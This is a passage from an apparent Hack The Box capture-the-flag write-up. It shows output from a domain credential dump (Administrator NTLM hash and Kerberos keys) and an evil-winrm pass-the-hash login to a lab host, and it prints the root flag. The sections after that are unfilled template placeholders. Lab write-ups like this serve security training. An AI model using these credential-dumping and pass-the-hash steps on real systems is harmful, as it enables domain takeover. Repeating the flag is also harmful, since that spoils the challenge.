[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bb06cbc02b39abeddd1335bc30b19e26:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:f5301f54fad85ba357fb859c94c5c31a6abe61f6db1986c03574bfd6c2e31632
Administrator:aes128-cts-hmac-sha1-96:678dcbcbf92bc72fd318ac4aa06ede64
Administrator:des-cbc-md5:13a8c8abc12f945e
[*] Cleaning up... 

```

```
evil-winrm -i 10.129.50.211 -u Administrator -H bb06cbc02b39abeddd1335bc30b19e26
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls


    Directory: C:\Users\Administrator\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         5/19/2022   2:32 AM                WindowsPowerShell
-a----         7/22/2022   3:55 AM           1479 clean.ps1
-a----         1/18/2024   5:27 AM            152 ldap.ps1
-a----         7/22/2022   3:54 AM         770279 PowerView.ps1


*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         7/13/2026   5:29 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
11e43cf5545779de8d02cb4136ad2b3b
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 

```



### Exploitation

Step-by-step privilege escalation.

```shell
# Commands used
```

---
## Remediation

- Key takeaway 1
- Key takeaway 2
- Key takeaway 3

---
## References

- [Reference 1](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)
- [Reference 2](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)
